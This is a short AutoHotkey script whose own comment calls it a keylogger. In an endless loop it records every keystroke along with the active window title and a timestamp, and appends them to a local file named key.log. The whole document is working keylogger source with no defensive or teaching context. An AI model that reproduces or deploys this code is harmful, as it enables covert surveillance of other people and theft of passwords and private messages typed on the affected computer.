#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

Loop {                                              ; Keylogger that also records page title and time.
  Input, k , V T5
  FormatTime, t ,, MM-dd-yyyy  hh:mm:ss tt
  WinGetActiveTitle , pt
  pttk = `n`n`n****************`n%pt%`n%t%`n`n%k%   ;    Defines variable pttk: page title, time, keys logged
  k:=pt!=pt2 ? pttk :k                              ;    Sets value of k to either pttk or k. 
  FileAppend, %k% , key.log
  pt2 := pt
}